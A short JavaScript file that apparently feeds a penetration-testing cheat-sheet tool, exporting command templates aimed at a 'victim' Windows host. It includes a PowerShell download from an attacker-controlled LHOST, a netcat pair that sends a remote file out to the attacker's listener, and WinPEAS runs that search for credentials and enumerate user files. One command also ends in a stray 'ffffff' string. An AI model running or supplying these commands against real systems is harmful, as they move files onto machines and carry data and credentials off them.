export var commands = {
    "gen" : {
        "Transfer File to victim (Powershell) ": "iwr http://{{LHOST}}:{{LPORT}}/{{LFILE}}",
        "Download File from victim (Netcat) - CMD ": "nc.exe {{LHOST}} {{LPORT}} -w 3 < {{RFILE}} \nnc -lnvp {{LPORT}} > {{LFILE}}\nffffff"
    },
    "winenum" : {
        "Enumerate using Winpeas": "./winpeas.exe",
        "Search for Credentials using winpeas": "./winpeas.exe credentials",
        "Search for files on the system": "Get-ChildItem -Path C:\\Users\\ -Include * -File -Recurse -ErrorAction SilentlyContinue"
    }

}
